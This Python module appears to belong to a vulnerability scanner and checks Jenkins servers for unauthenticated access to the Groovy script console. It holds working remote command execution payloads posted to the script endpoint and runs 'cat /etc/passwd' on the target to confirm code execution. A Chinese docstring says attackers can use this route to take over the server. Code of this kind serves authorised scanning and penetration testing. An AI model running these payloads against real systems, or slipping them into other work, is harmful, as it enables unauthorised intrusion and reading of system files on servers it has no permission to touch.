#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool import check

jenkins_unauthorized_payloads = [
    {
        'path': 'script',
        'data': '''script=println 'RCECOMMAND'.execute().text&json={"script": "println 'RCECOMMAND'.execute().text", "": "println 'RCECOMMAND'.execute().text"}'''
    },
    {
        'path': '',
        'data': '''script=println 'RCECOMMAND'.execute().text&json={"script": "println 'RCECOMMAND'.execute().text", "": "println 'RCECOMMAND'.execute().text"}'''
    },
]

def unauth_scan(clients):
    ''' 默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令
            攻击者可通过未授权访问漏洞
            或者暴力破解用户密码等进入后台管理服务
        通过脚本执行界面从而获取服务器权限
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'Jenkins',
        'vul_type': 'unAuth/RCE',
        'vul_id': 'jenkins-unauthorized',
    }
    
    headers = {
        'Origin': client.protocol_domain,
        'Referer': client.protocol_domain,
    }
    
    for payload in jenkins_unauthorized_payloads:
        path = payload['path']
        data = payload['data'].replace('RCECOMMAND', 'cat /etc/passwd')

        res = client.request(
            'post',
            path,
            data=data,
            headers=headers,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res_fileread(res.text)):
            results = {
                'Target': res.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
